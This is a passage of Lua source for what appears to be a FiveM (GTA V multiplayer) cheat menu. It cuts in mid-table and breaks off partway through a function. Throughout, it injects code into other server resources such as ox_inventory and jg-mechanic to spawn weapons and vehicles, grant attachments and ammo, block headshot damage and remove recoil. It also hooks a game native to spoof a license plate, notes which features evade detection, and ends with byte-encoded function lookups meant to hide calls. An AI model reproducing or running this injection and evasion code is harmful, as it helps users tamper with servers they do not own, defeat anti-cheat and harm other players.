                        { type = "scrollable", label = "Shotguns", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_pumpshotgun", "weapon_pumpshotgun_mk2", "weapon_sawnoffshotgun", "weapon_assaultshotgun", "weapon_bullpupshotgun", "weapon_heavyshotgun", "weapon_autoshotgun" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Snipers", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_sniperrifle", "weapon_heavysniper", "weapon_heavysniper_mk2", "weapon_marksmanrifle", "weapon_marksmanrifle_mk2" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Explosives", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_grenade", "weapon_stickybomb", "weapon_molotov", "weapon_pipebomb", "weapon_proxmine", "weapon_rpg", "weapon_grenadelauncher", "weapon_rpg", "weapon_minigun", "weapon_firework" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Heavy", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_mg", "weapon_combatmg", "weapon_gusenberg", "weapon_minigun", "weapon_grenadelauncher", "weapon_railgun", "weapon_hominglauncher", "weapon_compactlauncher" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Throwables", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_ball", "weapon_flare", "weapon_smokegrenade", "weapon_bzgas", "weapon_petrolcan" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        }
                    }
                },
                {
                    label = "Combat",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Suppressor", "Magazine", "Flashlight", "Scopes", "Grip"}, label = "Attachments",
                            onSelect = function(value)
                                if value == "Suppressor" then
                                    MachoInjectResourceRaw("ox_inventory", [[
                                        local ped = PlayerPedId()
                                        local currentWep = GetSelectedPedWeapon(ped)
                                        local components = {0x65EA7EBB, 0x837445AA, 0xA73D4664, 0xC304849A, 0xE608B35E, 0xC6654D78, 0x448892A, 0x3CC6BD52}
                                        for _, comp in ipairs(components) do 
                                            if DoesWeaponTakeWeaponComponent(currentWep, comp) then
                                                GiveWeaponComponentToPed(ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Magazine" then
                                    MachoInjectResourceRaw("ox_inventory", [[
                                        local ped = PlayerPedId()
                                        local currentWep = GetSelectedPedWeapon(ped)
                                        local components = {0xED265A1C, 0xD67B4F2D, 0x249A17D5, 0xD9D3AC92, 0x7B0033B3, 0x64F9C62B, 0xCE8C0772, 0x5ED6C128, 0x33BA12E8, 0x81786CA9, 0x10E6BA2B, 0x350966FB, 0xBB46E417, 0x937ED0B7, 0xB9835B2E, 0xB92C6979, 0x334A5203, 0x82158B86, 0xB16A3CD}
                                        for _, comp in ipairs(components) do 
                                            if DoesWeaponTakeWeaponComponent(currentWep, comp) then
                                                GiveWeaponComponentToPed(ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Flashlight" then
                                    MachoInjectResourceRaw("ox_inventory", [[
                                        local ped = PlayerPedId()
                                        local currentWep = GetSelectedPedWeapon(ped)
                                        local flashlights = {0x7BC4CD10, 0x43FD5F0E, 0xC7AE6C97, 0xA196D98C}
                                        for _, comp in ipairs(flashlights) do 
                                            if DoesWeaponTakeWeaponComponent(currentWep, comp) then
                                                GiveWeaponComponentToPed(ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Scopes" then
                                    MachoInjectResourceRaw("ox_inventory", [[
                                        local ped = PlayerPedId()
                                        local currentWep = GetSelectedPedWeapon(ped)
                                        local scopes = {
                                            0xC2CC3929, 0x9D2FBA71, 0xA27457FC, 0x5F333923, 
                                            0xC16479C7, 0x3CC6BD52, 0x1621AD14, 0x435976C4
                                        }
                                        for _, comp in ipairs(scopes) do 
                                            if DoesWeaponTakeWeaponComponent(currentWep, comp) then
                                                GiveWeaponComponentToPed(ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Grip" then
                                    MachoInjectResourceRaw("ox_inventory", [[
                                        local ped = PlayerPedId()
                                        local currentWep = GetSelectedPedWeapon(ped)
                                        local grips = {0xC7086851, 0xE5264706}
                                        for _, comp in ipairs(grips) do 
                                            if DoesWeaponTakeWeaponComponent(currentWep, comp) then
                                                GiveWeaponComponentToPed(ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                end
                            end
                        },
                        {
                            icon = "",
                            type = "scrollable",
                            value = 1,
                            values = { "Suppressor", "Magazine", "Flashlight", "Scopes", "Grip"},
                            label = "Remove",
                            onSelect = function(value)
                                if value == "Suppressor" then
                                    MachoInjectResourceRaw("ox_inventory", [[
                                        local ped = PlayerPedId()
                                        local currentWep = GetSelectedPedWeapon(ped)
                                        local components = {0x65EA7EBB, 0x837445AA, 0xA73D4664, 0xC304849A, 0xE608B35E, 0xC6654D78, 0x448892A, 0x3CC6BD52}
                                        for _, comp in ipairs(components) do 
                                            if HasPedGotWeaponComponent(ped, currentWep, comp) then
                                                RemoveWeaponComponentFromPed(ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Magazine" then
                                    MachoInjectResourceRaw("ox_inventory", [[
                                        local ped = PlayerPedId()
                                        local currentWep = GetSelectedPedWeapon(ped)
                                        local components = {0xED265A1C, 0xD67B4F2D, 0x249A17D5, 0xD9D3AC92, 0x7B0033B3, 0x64F9C62B, 0xCE8C0772, 0x5ED6C128, 0x33BA12E8, 0x81786CA9, 0x10E6BA2B, 0x350966FB, 0xBB46E417, 0x937ED0B7, 0xB9835B2E, 0xB92C6979, 0x334A5203, 0x82158B86, 0xB16A3CD}
                                        for _, comp in ipairs(components) do 
                                            if HasPedGotWeaponComponent(ped, currentWep, comp) then
                                                RemoveWeaponComponentFromPed(ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Flashlight" then
                                    MachoInjectResourceRaw("ox_inventory", [[
                                        local ped = PlayerPedId()
                                        local currentWep = GetSelectedPedWeapon(ped)
                                        local flashlights = {0x7BC4CD10, 0x43FD5F0E, 0xC7AE6C97, 0xA196D98C}
                                        for _, comp in ipairs(flashlights) do 
                                            if HasPedGotWeaponComponent(ped, currentWep, comp) then
                                                RemoveWeaponComponentFromPed(ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Scopes" then
                                    MachoInjectResourceRaw("ox_inventory", [[
                                        local ped = PlayerPedId()
                                        local currentWep = GetSelectedPedWeapon(ped)
                                        local scopes = {0xC2CC3929, 0x9D2FBA71, 0xA27457FC, 0x5F333923, 0xC16479C7, 0x3CC6BD52, 0x1621AD14, 0x435976C4}
                                        for _, comp in ipairs(scopes) do 
                                            if HasPedGotWeaponComponent(ped, currentWep, comp) then
                                                RemoveWeaponComponentFromPed(ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                elseif value == "Grip" then
                                    MachoInjectResourceRaw("ox_inventory", [[
                                        local ped = PlayerPedId()
                                        local currentWep = GetSelectedPedWeapon(ped)
                                        local grips = {0xC7086851, 0xE5264706}
                                        for _, comp in ipairs(grips) do 
                                            if HasPedGotWeaponComponent(ped, currentWep, comp) then
                                                RemoveWeaponComponentFromPed(ped, currentWep, comp) 
                                            end
                                        end
                                    ]])
                                end
                            end
                        },
                        {
                            type = "slider",
                            label = "Refill Ammo",
                            desc = "Ammo refill into the current weapon.",
                            scrollType = "onEnter",
                            value = 1,
                            min = 1,
                            max = 300,
                            step = 1.0,
                            onSelect = function(value)
                                MachoInjectResourceRaw("ox_inventory", [[
                                    local ped = PlayerPedId()
                                    local found, currentWep = GetCurrentPedWeapon(ped, true)
                                    
                                    if found and currentWep ~= GetHashKey("WEAPON_UNARMED") then
                                        SetPedAmmo(ped, currentWep, ]] .. math.floor(value) .. [[)
                                    end
                                ]])
                            end
                        },
                        { type = "checkbox", label = "Infinite Ammo", desc = "Infinite Ammo, this might be detected on certain servers", checked = false,
                            onSelect = function(checked)
                                if checked then
                                    self:EnableInfiniteAmmo(checked)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Headshot",
                            checked = false,
                            desc = "This will prevent you from being headshot.",
                            onSelect = function(checked)
                                if checked then
                                    self:Notify("success", "WTP", "Enabled Anti-Headshot", 5000)
                                    MachoInjectResourceRaw('any', [[
                                        local bp = setmetatable({}, {
                                            __index = function(_, k)
                                                local v = _G[k]
                                                return type(v) == "function" and function(...) return v(...) end or v
                                            end
                                        })

                                        _G.AntiHeadshot = true
                                        CreateThread(function()
                                            local lastHealth = bp.GetEntityHealth(bp.PlayerPedId())
                                            while _G.AntiHeadshot do
                                                local ped = bp.PlayerPedId()
                                                bp.SetPedSuffersCriticalHits(ped, false)

                                                local health = bp.GetEntityHealth(ped)
                                                local _, bone = bp.GetPedLastDamageBone(ped)

                                                if bone == 31086 and health < lastHealth then
                                                    bp.SetEntityHealth(ped, lastHealth)
                                                    bp.ClearPedLastDamageBone(ped)
                                                else
                                                    lastHealth = health
                                                end

                                                Wait(0)
                                            end
                                        end)
                                    ]])
                                else
                                    MachoInjectResourceRaw('any', [[
                                        _G.AntiHeadshot = false
                                        SetPedSuffersCriticalHits(PlayerPedId(), true)
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Ignore Max Range",
                            desc = "Allows you to ignore max range.",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    MachoInjectResourceRaw(targetRes, [[
                                        _G.IgnoreMaxActive = true
                                        Citizen.CreateThread(function()
                                            while _G.IgnoreMaxActive do
                                                Wait(0)
                                                SetPedResetFlag(PlayerPedId(), 95, GetMaxRangeOfCurrentPedWeapon(PlayerPedId()) < 250.0)
                                            end
                                        end)
                                    ]])
                                else
                                    MachoInjectResourceRaw(targetRes, [[
                                        _G.IgnoreMaxActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "No Recoil",
                            desc = "Undetected.",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    MachoInjectResourceRaw(targetRes, [[
                                        _G.NoRecoilActive = true
                                        Citizen.CreateThread(function()
                                            while _G.NoRecoilActive do
                                                Wait(0)
                                                local cam = GetRenderingCam()
                                                StopGameplayCamShaking(true)
                                                StopCamShaking(cam, true)
                                                ShakeGameplayCam = function(shakeName, intensity)
                                                    return 1
                                                end
                                            end
                                        end)
                                    ]])
                                else
                                    MachoInjectResourceRaw(targetRes, [[
                                        _G.NoRecoilActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "No Aim Blocking",
                            desc = "Allows aiming even when normally blocked.",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    executeCode(targetRes, [[
                                        _G.NoAimActive = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.NoAimActive do
                                                WTP.SafeRunNative(SetWeaponsNoAimBlocking, true)
                                                Wait(1000)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode(targetRes, [[
                                        _G.NoAimActive = false
                                        WTP.SafeRunNative(SetWeaponsNoAimBlocking, false)
                                    ]])
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "ph ph-car",
            label = "Vehicle Options",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        { type = "divider", label = "All Vehicles" },
                        { type = "button", label = "Scan Vehicle Addon's",
                            onSelect = function()
                                MachoInjectResourceRaw(targetSafeRes, [[
                                    Citizen.CreateThread(function()
                                        local function FindCustomVehicles()
                                            Citizen.Wait(500)
                                            
                                            local vehicleNames = {}
                                            local foundVehicles = 0
                                            
                                            local targetFiles = {
                                                'vehicles.meta',
                                                'carvariations.meta',
                                                'handling.meta',
                                                'vehiclelayouts.meta'
                                            }
                                            
                                            print('^2[Vehicle Finder] Starting search for custom vehicles in meta files...^0')
                                            
                                            for i = 0, GetNumResources() - 1 do
                                                local resourceName = GetResourceByFindIndex(i)
                                                if resourceName and GetResourceState(resourceName) == 'started' then
                                                    for _, targetFile in ipairs(targetFiles) do
                                                        local fileContent = LoadResourceFile(resourceName, targetFile)
                                                        
                                                        if fileContent then
                                                            if targetFile == 'vehicles.meta' or targetFile == 'carvariations.meta' then
                                                                for modelName in fileContent:gmatch('<modelName>([^<]+)</modelName>') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                                
                                                                for modelName in fileContent:gmatch('modelName="([^"]+)"') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                            end
                                                            
                                                            if targetFile == 'handling.meta' then
                                                                for modelName in fileContent:gmatch('<handlingName>([^<]+)</handlingName>') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                            end
                                                            
                                                            if targetFile == 'vehiclelayouts.meta' then
                                                                for modelName in fileContent:gmatch('<layout>([^<]+)</layout>') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                            end
                                                        end
                                                        
                                                        local streamFile = LoadResourceFile(resourceName, 'stream/' .. targetFile)
                                                        if streamFile then
                                                            if targetFile == 'vehicles.meta' or targetFile == 'carvariations.meta' then
                                                                for modelName in streamFile:gmatch('<modelName>([^<]+)</modelName>') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                            end
                                                            
                                                            if targetFile == 'handling.meta' then
                                                                for modelName in streamFile:gmatch('<handlingName>([^<]+)</handlingName>') do
                                                                    if modelName and modelName ~= "" then
                                                                        vehicleNames[modelName:lower()] = true
                                                                        foundVehicles = foundVehicles + 1
                                                                    end
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                            
                                            print('^2================================^0')
                                            print('^2    CUSTOM VEHICLES^0')
                                            print('^2================================^0')
                                            
                                            if next(vehicleNames) then
                                                local count = 0
                                                local sortedVehicles = {}
                                                
                                                for name, _ in pairs(vehicleNames) do
                                                    table.insert(sortedVehicles, name)
                                                    count = count + 1
                                                end
                                                
                                                table.sort(sortedVehicles)
                                                
                                                print(string.format('^3Custom vehicles found in the Server: %d^0', count))
                                                print('^2--------------------------------^0')
                                                
                                                for _, name in ipairs(sortedVehicles) do
                                                    print(string.format('^7    %s^0', name))
                                                end
                                            else
                                                print('^1    No custom vehicles found in the Server^0')
                                            end
                                            
                                            print('^2================================^0')
                                            print('^2[Vehicle Finder] Search completed!^0')
                                        end
                                        
                                        FindCustomVehicles()
                                    end)
                                ]])
                            end
                        },
                        { type = "button", label = "Addon",
                            onSelect = function()
                                KeyboardInput("Addon Vehicle", "", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedVehicle(val)
                                    end
                                end, "typeable")
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sedans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "asea", "asea2", "asterope", "asterope2", "cinquemila", "driftchavosv6", "cog55", "cog552", "cognoscenti", "cognoscenti2", "deity", "hardy", "drifthardy", "emperor", "emperor2", "emperor3", "fugitive", "glendale", "glendale2", "impaler5", "ingot", "intruder", "minimus", "limo2", "premier", "primo", "primo2", "regina", "rhinehart", "romero", "schafter2", "schafter5", "schafter6", "stafford", "stanier", "stratum", "stretch", "superd", "surge", "tailgater", "tailgater2", "warrener", "warrener2", "washington" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "SUVs",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "aleutian", "astron", "baller", "baller2", "baller3", "baller4", "baller5", "baller6", "baller7", "baller8", "bjxl", "cavalcade", "cavalcade2", "cavalcade3", "contender", "dorado", "dubsta", "dubsta2", "everon3", "fq2", "granger", "granger2", "gresley", "habanero", "huntley", "issi8", "iwagen", "jubilee", "landstalker", "landstalker2", "mesa", "mesa2", "novak", "patriot", "patriot2", "radi", "rebla", "rocoto", "seminole", "seminole2", "serrano", "squaddie", "toros", "vivanite", "woodlander", "xls", "xls2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Coupes",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "cogcabrio", "driftfr36", "exemplar", "f620", "felon", "felon2", "fr36", "jackal", "kanjosj", "oracle", "oracle2", "postlude", "previon", "sentinel", "sentinel2", "windsor", "windsor2", "zion", "zion2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Muscles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "blade", "brigham", "broadway", "buccaneer", "buccaneer2", "buffalo4", "buffalo5", "chino", "chino2", "clique", "clique2", "coquette3", "deviant", "dominator", "dominator2", "dominator3", "dominator4", "dominator5", "dominator6", "dominator7", "dominator8", "dominator9", "driftdominator10", "driftyosemite", "dukes", "dukes2", "dukes3", "ellie", "eudora", "faction", "faction2", "faction3", "gauntlet", "gauntlet2", "gauntlet3", "gauntlet4", "gauntlet5", "driftgauntlet4", "greenwood", "hermes", "hotknife", "hustler", "impaler", "impaler2", "impaler3", "impaler4", "impaler6", "imperator", "imperator2", "imperator3", "lurcher", "manana2", "moonbeam", "moonbeam2", "nightshade", "peyote2", "phoenix", "picador", "ratloader", "ratloader2", "ruiner", "ruiner2", "ruiner3", "ruiner4", "sabregt", "sabregt2", "slamvan", "slamvan2", "slamvan3", "slamvan4", "slamvan5", "slamvan6", "stalion", "stalion2", "tahoma", "tampa", "tampa3", "tampa4", "tulip", "tulip2", "vamos", "vigero", "vigero2", "vigero3", "virgo", "virgo2", "virgo3", "voodoo", "voodoo2", "weevil2", "yosemite", "yosemite2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports Classic",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "ardent", "btype", "btype2", "btype3", "casco", "cheburek", "cheetah2", "cheetah3", "coquette2", "deluxo", "dynasty", "fagaloa", "feltzer3", "gt500", "infernus2", "jb700", "jb7002", "mamba", "manana", "michelli", "monroe", "nebula", "peyote", "peyote3", "pigalle", "rapidgt3", "retinue", "retinue2", "savestra", "stinger", "stingergt", "stromberg", "swinger", "toreador", "torero", "tornado", "tornado2", "tornado3", "tornado4", "tornado5", "tornado6", "turismo2", "viseris", "z190", "zion3", "ztype" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports",
                            type = "scrollable",
                            value = 1,
                            values = { "alpha", "banshee", "bestiagts", "blista2", "blista3", "buffalo", "buffalo2", "buffalo3", "calico", "carbonizzare", "comet2", "comet3", "comet4", "comet5", "comet6", "comet7", "coquette", "coquette4", "corsita", "coureur", "cypher", "drafter", "drifteuros", "driftfuto", "driftjester", "driftremus", "drifttampa", "driftzr350", "elegy", "elegy2", "euros", "everon2", "feltzer2", "flashgt", "furoregt", "fusilade", "futo", "futo2", "gauntlet6", "gb200", "growler", "hotring", "imorgon", "issi7", "italigto", "italirsx", "jester", "jester2", "jester3", "jester4", "jugular", "khamelion", "komoda", "kuruma", "kuruma2", "locust", "lynx", "massacro", "massacro2", "neo", "neon", "ninef", "ninef2", "omnis", "omnisegt", "panthere", "paragon", "paragon2", "pariah", "penumbra", "penumbra2", "r300", "raiden", "rapidgt", "rapidgt2", "rapidgt4", "raptor", "remus", "revolter", "rt3000", "ruston", "schafter3", "schafter4", "schlagen", "schwarzer", "sentinel3", "sentinel4", "sentinel5", "seven70", "sm722", "specter", "specter2", "stingertt", "streiter", "sugoi", "sultan", "sultan2", "sultan3", "surano", "tampa2", "tenf", "tenf2", "tropos", "vectre", "verlierer2", "veto", "veto2", "vstr", "zr350", "zr380", "zr3802", "zr3803" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Super",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "adder", "autarch", "banshee2", "bullet", "champion", "cheetah", "cyclone", "deveste", "emerus", "entity2", "entity3", "entityxf", "fmj", "furia", "gp1", "ignus", "infernus", "italigtb", "italigtb2", "krieger", "le7b", "lm87", "nero", "nero2", "osiris", "penetrator", "pfister811", "prototipo", "reaper", "s80", "sc1", "scramjet", "sheava", "sultanrs", "suzume", "t20", "taipan", "tempesta", "tezeract", "thrax", "tigon", "torero2", "turismo3", "turismor", "tyrant", "tyrus", "vacca", "vagner", "vigilante", "virtue", "visione", "voltic", "voltic2", "xa21", "zeno", "zentorno", "zorrusso" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Motorcycles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "akuma", "avarus", "bagger", "bati", "bati2", "bf400", "carbonrs", "chimera", "cliffhanger", "daemon", "daemon2", "deathbike", "deathbike2", "deathbike3", "defiler", "diablous", "diablous2", "double", "enduro", "esskey", "faggio", "faggio2", "faggio3", "fcr", "fcr2", "gargoyle", "hakuchou", "hakuchou2", "hexer", "innovation", "lectro", "manchez", "manchez2", "manchez3", "nemesis", "nightblade", "oppressor", "oppressor2", "pcj", "powersurge", "ratbike", "reever", "rrocket", "ruffian", "sanchez", "sanchez2", "sanctus", "shinobi", "shotaro", "sovereign", "stryder", "thrust", "vader", "vindicator", "vortex", "wolfsbane", "zombiea", "zombieb" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Off-Road",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bfinjection", "bifta", "blazer", "blazer2", "blazer3", "blazer4", "blazer5", "bodhi2", "boor", "brawler", "bruiser", "bruiser2", "bruiser3", "brutus", "brutus2", "brutus3", "caracara", "caracara2", "dloader", "draugur", "driftl352", "dubsta3", "dune", "dune2", "dune3", "dune4", "dune5", "freecrawler", "hellion", "insurgent", "insurgent2", "insurgent3", "kalahari", "kamacho", "l35", "l352", "marshall", "menacer", "mesa3", "monster", "monster3", "monster4", "monster5", "monstrociti", "nightshark", "outlaw", "patriot3", "rancherxl", "rancherxl2", "ratel", "rcbandito", "rebel", "rebel2", "riata", "sandking", "sandking2", "technical", "technical2", "technical3", "terminus", "trophytruck", "trophytruck2", "vagrant", "verus", "winky", "yosemite3", "zhaba" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Industrial",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bulldozer", "cutter", "dump", "flatbed", "flatbed2", "guardian", "handler", "mixer", "mixer2", "rubble", "tiptruck", "tiptruck2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Utility",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "airtug", "armytanker", "armytrailer", "armytrailer2", "baletrailer", "boattrailer", "boattrailer2", "boattrailer3", "caddy", "caddy2", "caddy3", "docktrailer", "docktug", "forklift", "freighttrailer", "graintrailer", "mower", "proptrailer", "raketrailer", "ripley", "sadler", "sadler2", "scrap", "slamtruck", "tanker", "tanker2", "towtruck", "towtruck2", "towtruck3", "towtruck4", "tr2", "tr3", "tr4", "tractor", "tractor2", "tractor3", "trailerlarge", "trailerlogs", "trailers", "trailers2", "trailers3", "trailers4", "trailers5", "trailersmall", "trflat", "tvtrailer", "tvtrailer2", "utillitruck", "utillitruck2", "utillitruck3" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Vans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bison", "bison2", "bison3", "bobcatxl", "boxville", "boxville2", "boxville3", "boxville4", "boxville5", "boxville6", "burrito", "burrito2", "burrito3", "burrito4", "burrito5", "camper", "gburrito", "gburrito2", "journey", "journey2", "minivan", "minivan2", "paradise", "pony", "pony2", "rumpo", "rumpo2", "rumpo3", "speedo", "speedo2", "speedo4", "speedo5", "surfer", "surfer2", "surfer3", "taco", "youga", "youga2", "youga3", "youga4" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected)
                            end
                        },
                    }
                },
                {
                    label = "Customization",
                    tabs = {
                        { type = "button", label = "Max All Tuning", desc = "Apply maximum performance and visual mods to your vehicle",
                            onSelect = function()
                                if GetResourceState("jg-mechanic") == "started" then
                                    executeCode('jg-mechanic', [[
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 then
                                            WTP.SafeRunNative(SetVehicleModKit, veh, 0)
                                            WTP.SafeRunNative(SetVehicleWheelType, veh, 7)
                                            
                                            for i = 0, 16 do
                                                local max = GetNumVehicleMods(veh, i)
                                                if max and max > 0 then WTP.SafeRunNative(SetVehicleMod, veh, i, max - 1, false) end
                                            end
                                            for i = 17, 22 do ToggleVehicleMod(veh, i, true) end

                                            WTP.SafeRunNative(SetVehicleMod, veh, 23, 1, false)
                                            WTP.SafeRunNative(SetVehicleMod, veh, 24, 1, false)
                                            for _, mod in ipairs({ 25, 27, 28, 30, 33, 34, 35 }) do
                                                local max = GetNumVehicleMods(veh, mod)
                                                if max and max > 0 then WTP.SafeRunNative(SetVehicleMod, veh, mod, max - 1, false) end
                                            end
                                            local max38 = GetNumVehicleMods(veh, 38)
                                            if max38 and max38 > 0 then WTP.SafeRunNative(SetVehicleMod, veh, 38, max38 - 1, true) end
                                            WTP.SafeRunNative(SetVehicleWindowTint, veh, 1)
                                            WTP.SafeRunNative(SetVehicleTyresCanBurst, veh, false)
                                            local currentProps = exports['jg-mechanic']:getVehicleProperties(veh)
                                            exports['jg-mechanic']:setVehicleProperties(veh, currentProps)
                                        end
                                    ]])
                                else
                                    executeCode('any', [[
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 then
                                            WTP.SafeRunNative(SetVehicleModKit, veh, 0)
                                            WTP.SafeRunNative(SetVehicleWheelType, veh, 7)
                                            for i = 0, 16 do
                                                local max = GetNumVehicleMods(veh, i)
                                                if max and max > 0 then WTP.SafeRunNative(SetVehicleMod, veh, i, max - 1, false) end
                                            end
                                            for i = 17, 22 do ToggleVehicleMod(veh, i, true) end
                                            WTP.SafeRunNative(SetVehicleMod, veh, 23, 1, false)
                                            WTP.SafeRunNative(SetVehicleMod, veh, 24, 1, false)
                                            for _, mod in ipairs({ 25, 27, 28, 30, 33, 34, 35 }) do
                                                local max = GetNumVehicleMods(veh, mod)
                                                if max and max > 0 then WTP.SafeRunNative(SetVehicleMod, veh, mod, max - 1, false) end
                                            end
                                            local max38 = GetNumVehicleMods(veh, 38)
                                            if max38 and max38 > 0 then WTP.SafeRunNative(SetVehicleMod, veh, 38, max38 - 1, true) end
                                            WTP.SafeRunNative(SetVehicleWindowTint, veh, 1)
                                            WTP.SafeRunNative(SetVehicleTyresCanBurst, veh, false)
                                        end
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Vehicle Options" },
                        {
                            type = "button",
                            label = "Set License Plate",
                            onSelect = function()
                                KeyboardInput("Set License Plate", "", function(val)
                                    if val and val ~= "" then
                                        local injectedCode = string.format([[
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsUsing(ped)
                                            if veh and veh ~= 0 then
                                                local originalPlate = GetVehicleNumberPlateText(veh)
                                                local hookedVeh = veh
                                                MachoHookNative(0x7CE1CCB9B293020E, function(vehicle)
                                                    if vehicle == hookedVeh then
                                                        return false, originalPlate
                                                    end
                                                    return true, GetVehicleNumberPlateText(vehicle)
                                                end)
                                                SetVehicleNumberPlateText(veh, "%s")
                                            end
                                        ]], val)

                                        executeCode("any", injectedCode)
                                    else
                                        WTP:Notify("Invalid input", "Please enter a valid license plate.", "error")
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Repair Vehicle",
                            onSelect = function()
                                if GetResourceState("jg-mechanic") == "started" then
                                    executeCode("jg-mechanic", [[
                                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                        if not vehicle then
                                            return
                                        end
                                        Framework.Client.RepairVehicle(vehicle)
                                    ]])
                                else
                                    MachoInjectResource2(NewThreadNs, 'any', [[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end

                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end

                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function _w(n)
                                            return Citizen.Wait(n)
                                        end

                                        local ped = _g(_b("PlayerPedId"))()
